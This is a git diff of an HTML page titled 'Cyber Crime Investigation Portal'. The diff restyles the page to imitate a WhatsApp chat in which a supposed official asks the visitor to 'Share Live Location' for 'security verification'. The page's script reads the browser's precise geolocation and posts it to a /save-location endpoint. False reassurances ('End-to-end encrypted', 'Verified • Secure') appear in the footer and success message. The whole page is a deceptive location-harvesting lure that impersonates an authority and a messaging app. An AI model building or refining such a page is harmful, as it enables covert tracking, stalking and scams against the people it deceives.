@@ -2,161 +2,377 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Cyber Crime Investigation Portal</title>
 <style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-}
-body{
-    background:linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    padding:20px;
-}
-.card{
-    width:100%;
-    max-width:450px;
-    background:#fff;
-    padding:40px;
-    border-radius:20px;
-    box-shadow:0 20px 60px rgba(0,0,0,0.3);
-    text-align:center;
-    animation:fadeIn 0.5s ease-in;
-}
-@keyframes fadeIn{
-    from{
-        opacity:0;
-        transform:translateY(-20px);
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
     }
-    to{
-        opacity:1;
-        transform:translateY(0);
+
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', 'Noto Sans', system-ui, 'Apple Color Emoji', 'Segoe UI Emoji', sans-serif;
+        background: #00a884;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 0;
+        margin: 0;
     }
-}
-.logo{
-    font-size:48px;
-    margin-bottom:20px;
-}
-h2{
-    color:#333;
-    margin-bottom:10px;
-    font-size:28px;
-}
-.subtitle{
-    color:#666;
-    margin-bottom:30px;
-    font-size:14px;
-}
-button{
-    width:100%;
-    border:none;
-    padding:16px;
-    border-radius:10px;
-    background:#2563eb;
-    color:white;
-    font-size:16px;
-    cursor:pointer;
-    transition:all 0.3s;
-    font-weight:600;
-}
-button:hover{
-    background:#1d4ed8;
-    transform:translateY(-2px);
-    box-shadow:0 5px 15px rgba(37,99,235,0.3);
-}
-button:active{
-    transform:translateY(0);
-}
-button:disabled{
-    opacity:0.6;
-    cursor:not-allowed;
-}
-.loader{
-    display:none;
-    width:50px;
-    height:50px;
-    border:4px solid #e5e7eb;
-    border-top:4px solid #2563eb;
-    border-radius:50%;
-    margin:20px auto;
-    animation:spin 0.8s linear infinite;
-}
-@keyframes spin{
-    100%{
-        transform:rotate(360deg);
+
+    /* WhatsApp Container */
+    .whatsapp-container {
+        width: 100%;
+        max-width: 450px;
+        height: 100vh;
+        max-height: 700px;
+        background: #f0f2f5;
+        display: flex;
+        flex-direction: column;
+        border-radius: 0;
+        overflow: hidden;
+        position: relative;
+        box-shadow: 0 0 20px rgba(0,0,0,0.2);
     }
-}
-#status{
-    margin-top:20px;
-    font-size:14px;
-    padding:12px;
-    border-radius:8px;
-}
-.success{
-    background:#d1fae5;
-    color:#065f46;
-}
-.error{
-    background:#fee2e2;
-    color:#991b1b;
-}
-.info{
-    background:#e0e7ff;
-    color:#3730a3;
-}
-.note{
-    margin-top:20px;
-    font-size:11px;
-    color:#9ca3af;
-}
+
+    /* WhatsApp Header */
+    .whatsapp-header {
+        background: #008069;
+        padding: 20px 16px 12px 16px;
+        color: white;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+
+    .header-icon {
+        font-size: 24px;
+        cursor: pointer;
+    }
+
+    .header-text {
+        flex: 1;
+    }
+
+    .header-text h2 {
+        font-size: 19px;
+        font-weight: 600;
+        margin: 0;
+    }
+
+    .header-text p {
+        font-size: 13px;
+        opacity: 0.9;
+        margin: 2px 0 0 0;
+    }
+
+    /* Chat Area */
+    .chat-area {
+        flex: 1;
+        overflow-y: auto;
+        padding: 20px 12px;
+        background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 600" opacity="0.05"><path fill="none" d="M0,0 L800,0 L800,600 L0,600 Z" /><path fill="none" stroke="%234a4a4a" stroke-width="1" d="M0,0 L800,600 M800,0 L0,600" /></svg>');
+        background-repeat: repeat;
+        background-size: 30px;
+    }
+
+    /* WhatsApp Message Bubble */
+    .message-bubble {
+        display: flex;
+        margin-bottom: 20px;
+        animation: slideUp 0.3s ease-out;
+    }
+
+    @keyframes slideUp {
+        from {
+            opacity: 0;
+            transform: translateY(20px);
+        }
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+
+    .message-bubble.outgoing {
+        justify-content: flex-end;
+    }
+
+    .bubble {
+        max-width: 85%;
+        padding: 10px 14px;
+        border-radius: 18px;
+        position: relative;
+        word-wrap: break-word;
+    }
+
+    .outgoing .bubble {
+        background: #d9fdd3;
+        border-top-right-radius: 4px;
+        color: #111b21;
+    }
+
+    .incoming .bubble {
+        background: white;
+        border-top-left-radius: 4px;
+        color: #111b21;
+    }
+
+    .message-text {
+        font-size: 14px;
+        line-height: 1.4;
+        margin-bottom: 6px;
+    }
+
+    .message-time {
+        font-size: 10px;
+        color: #667781;
+        text-align: right;
+        margin-top: 4px;
+    }
+
+    /* Location Request Card */
+    .location-request {
+        background: white;
+        border-radius: 24px;
+        margin: 20px 0;
+        overflow: hidden;
+        box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        animation: slideUp 0.3s ease-out;
+    }
+
+    .location-icon {
+        background: #e8f0fe;
+        padding: 30px;
+        text-align: center;
+    }
+
+    .location-icon span {
+        font-size: 64px;
+    }
+
+    .location-content {
+        padding: 20px;
+        text-align: center;
+    }
+
+    .location-content h3 {
+        font-size: 18px;
+        color: #111b21;
+        margin-bottom: 8px;
+    }
+
+    .location-content p {
+        font-size: 14px;
+        color: #667781;
+        margin-bottom: 20px;
+        line-height: 1.4;
+    }
+
+    .btn-location {
+        background: #008069;
+        color: white;
+        border: none;
+        padding: 12px 24px;
+        border-radius: 24px;
+        font-size: 15px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s;
+        width: 100%;
+    }
+
+    .btn-location:hover {
+        background: #00695c;
+    }
+
+    .btn-location:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+    }
+
+    /* Loading Dots (WhatsApp style) */
+    .loading-dots {
+        display: flex;
+        gap: 4px;
+        padding: 8px 12px;
+        background: white;
+        border-radius: 18px;
+        width: fit-content;
+    }
+
+    .loading-dots span {
+        width: 8px;
+        height: 8px;
+        background: #667781;
+        border-radius: 50%;
+        animation: bounce 1.4s infinite ease-in-out both;
+    }
+
+    .loading-dots span:nth-child(1) { animation-delay: -0.32s; }
+    .loading-dots span:nth-child(2) { animation-delay: -0.16s; }
+
+    @keyframes bounce {
+        0%, 80%, 100% { transform: scale(0); }
+        40% { transform: scale(1); }
+    }
+
+    /* Status Message */
+    .status-message {
+        display: flex;
+        justify-content: center;
+        margin: 10px 0;
+    }
+
+    .status-bubble {
+        background: #e8f0fe;
+        padding: 6px 12px;
+        border-radius: 16px;
+        font-size: 12px;
+        color: #008069;
+        text-align: center;
+    }
+
+    /* Footer */
+    .whatsapp-footer {
+        background: #f0f2f5;
+        padding: 10px 16px;
+        border-top: 1px solid #e9edef;
+        text-align: center;
+    }
+
+    .footer-text {
+        font-size: 11px;
+        color: #667781;
+    }
+
+    /* Typing Indicator */
+    .typing-indicator {
+        display: none;
+        margin-bottom: 20px;
+    }
+
+    /* Verified Badge */
+    .verified-badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 4px;
+        background: #d9fdd3;
+        padding: 4px 12px;
+        border-radius: 20px;
+        font-size: 12px;
+        color: #008069;
+        margin-top: 8px;
+    }
+
+    /* Scrollbar */
+    .chat-area::-webkit-scrollbar {
+        width: 6px;
+    }
+
+    .chat-area::-webkit-scrollbar-track {
+        background: transparent;
+    }
+
+    .chat-area::-webkit-scrollbar-thumb {
+        background: #c0c0c0;
+        border-radius: 3px;
+    }
 </style>
 </head>
 <body>
-<div class="card">
-    <div class="logo">🔒</div>
-    <h2>Verification Required</h2>
-    <div class="subtitle">
-        Your location will be collected for security verification
+<div class="whatsapp-container">
+    <!-- WhatsApp Header -->
+    <div class="whatsapp-header">
+        <div class="header-icon">🔒</div>
+        <div class="header-text">
+            <h2>Cyber Crime Portal</h2>
+            <p>Online • Verification Required</p>
+        </div>
+        <div class="header-icon">⋮</div>
     </div>
-    <button id="verifyBtn" onclick="startVerification()">
-        Continue to Verification
-    </button>
-    <div class="loader" id="loader"></div>
-    <div id="status"></div>
-    <div class="note">
-        This information is confidential and used only for verification purposes.
+
+    <!-- Chat Area -->
+    <div class="chat-area" id="chatArea">
+        <!-- Incoming Message -->
+        <div class="message-bubble incoming">
+            <div class="bubble">
+                <div class="message-text">
+                    🔐 <strong>Security Verification</strong><br>
+                    Please share your location to complete the verification process.
+                </div>
+                <div class="message-time">Just now</div>
+            </div>
+        </div>
+
+        <!-- Location Request Card -->
+        <div id="locationCard" class="location-request">
+            <div class="location-icon">
+                <span>📍</span>
+            </div>
+            <div class="location-content">
+                <h3>Share Location</h3>
+                <p>This helps us verify your identity and ensure secure access</p>
+                <button id="verifyBtn" class="btn-location" onclick="startVerification()">
+                    Share Live Location
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="whatsapp-footer">
+        <div class="footer-text">
+            🔒 End-to-end encrypted • Your location is secure
+        </div>
     </div>
 </div>
+
 <script>
 function startVerification(){
     const btn = document.getElementById("verifyBtn");
     btn.disabled = true;
-    btn.style.opacity = "0.6";
-    btn.textContent = "Processing...";
-    document.getElementById("loader").style.display = "block";
-    const statusDiv = document.getElementById("status");
-    statusDiv.className = "info";
-    statusDiv.innerHTML = "📍 Requesting location permission...";
-    getLocation();
+    btn.textContent = "📍 Requesting...";
+    
+    // Add typing indicator
+    const chatArea = document.getElementById("chatArea");
+    const typingDiv = document.createElement('div');
+    typingDiv.className = 'typing-indicator';
+    typingDiv.id = 'typingIndicator';
+    typingDiv.innerHTML = `
+        <div class="message-bubble incoming">
+            <div class="loading-dots">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    `;
+    typingDiv.style.display = 'block';
+    chatArea.appendChild(typingDiv);
+    chatArea.scrollTop = chatArea.scrollHeight;
+    
+    setTimeout(() => {
+        getLocation();
+    }, 500);
 }
+
 function getLocation() {
-    let statusBox = document.getElementById("status");
     if (!navigator.geolocation) {
-        statusBox.className = "error";
-        statusBox.innerHTML = "❌ Geolocation is not supported by your browser";
+        showStatusMessage("❌ Geolocation is not supported by your browser", "error");
         resetButton();
+        removeTypingIndicator();
         return;
     }
+
     navigator.geolocation.getCurrentPosition(
         function(position){
-            statusBox.className = "info";
-            statusBox.innerHTML = "📡 Sending location data to server...";
+            removeTypingIndicator();
+            showStatusMessage("📍 Getting your location...", "info");
+            
+            // Send to server
             fetch('/save-location', {
                 method:'POST',
                 headers:{
@@ -170,31 +386,33 @@ function getLocation() {
             })
             .then(response => response.json())
             .then(data => {
-                document.getElementById("loader").style.display = "none";
                 if(data.status === "success"){
-                    statusBox.className = "success";
-                    statusBox.innerHTML = "✅ Verification completed successfully! Thank you.";
+                    // Remove location card
+                    const locationCard = document.getElementById("locationCard");
+                    if(locationCard) locationCard.style.display = 'none';
+                    
+                    // Add success message
+                    addSuccessMessage(position.coords.latitude, position.coords.longitude);
+                    
+                    // Reset button
                     resetButton();
                 } else {
-                    statusBox.className = "error";
-                    statusBox.innerHTML = "❌ Server error: " + data.message;
+                    showStatusMessage("❌ Server error: " + data.message, "error");
                     resetButton();
                 }
             })
             .catch(error => {
-                document.getElementById("loader").style.display = "none";
-                statusBox.className = "error";
-                statusBox.innerHTML = "❌ Network error! Please try again.";
                 console.error("Fetch error:", error);
+                showStatusMessage("❌ Network error! Please try again.", "error");
                 resetButton();
             });
         },
         function(error){
-            document.getElementById("loader").style.display = "none";
+            removeTypingIndicator();
             let msg = "";
             switch(error.code){
                 case 1:
-                    msg = "Permission denied. Please allow location access.";
+                    msg = "Permission denied. Please enable location access.";
                     break;
                 case 2:
                     msg = "Location unavailable. Please check your GPS.";
@@ -205,8 +423,7 @@ function getLocation() {
                 default:
                     msg = "Unknown error occurred.";
             }
-            statusBox.className = "error";
-            statusBox.innerHTML = "❌ " + msg;
+            showStatusMessage("❌ " + msg, "error");
             resetButton();
         },
         {
@@ -216,12 +433,76 @@ function getLocation() {
         }
     );
 }
+
+function addSuccessMessage(lat, lng) {
+    const chatArea = document.getElementById("chatArea");
+    
+    // Outgoing message (user's location)
+    const outgoingDiv = document.createElement('div');
+    outgoingDiv.className = 'message-bubble outgoing';
+    outgoingDiv.innerHTML = `
+        <div class="bubble">
+            <div class="message-text">
+                📍 <strong>Location shared</strong><br>
+                <span style="font-size: 12px; color: #667781;">Lat: ${lat.toFixed(6)}<br>Lng: ${lng.toFixed(6)}</span>
+            </div>
+            <div class="message-time">Just now ✓✓</div>
+        </div>
+    `;
+    chatArea.appendChild(outgoingDiv);
+    
+    // Incoming success message
+    const incomingDiv = document.createElement('div');
+    incomingDiv.className = 'message-bubble incoming';
+    incomingDiv.innerHTML = `
+        <div class="bubble">
+            <div class="message-text">
+                ✅ <strong>Verification Successful!</strong><br>
+                Your location has been recorded. Thank you for your cooperation.
+            </div>
+            <div class="message-time">Just now</div>
+            <div class="verified-badge">
+                ✓ Verified • Secure
+            </div>
+        </div>
+    `;
+    chatArea.appendChild(incomingDiv);
+    
+    chatArea.scrollTop = chatArea.scrollHeight;
+}
+
+function showStatusMessage(message, type) {
+    const chatArea = document.getElementById("chatArea");
+    const statusDiv = document.createElement('div');
+    statusDiv.className = 'status-message';
+    statusDiv.innerHTML = `
+        <div class="status-bubble" style="background: ${type === 'error' ? '#fee2e2' : '#e8f0fe'}; color: ${type === 'error' ? '#dc2626' : '#008069'}">
+            ${message}
+        </div>
+    `;
+    chatArea.appendChild(statusDiv);
+    chatArea.scrollTop = chatArea.scrollHeight;
+    
+    // Remove after 3 seconds
+    setTimeout(() => {
+        if(statusDiv && statusDiv.parentNode) {
+            statusDiv.remove();
+        }
+    }, 3000);
+}
+
+function removeTypingIndicator() {
+    const typing = document.getElementById("typingIndicator");
+    if(typing) typing.remove();
+}
+
 function resetButton() {
     const btn = document.getElementById("verifyBtn");
-    btn.disabled = false;
-    btn.style.opacity = "1";
-    btn.textContent = "Continue to Verification";
-    document.getElementById("loader").style.display = "none";
+    if(btn) {
+        btn.disabled = false;
+        btn.textContent = "Share Live Location";
+    }
+    removeTypingIndicator();
 }
 </script>
 </body>
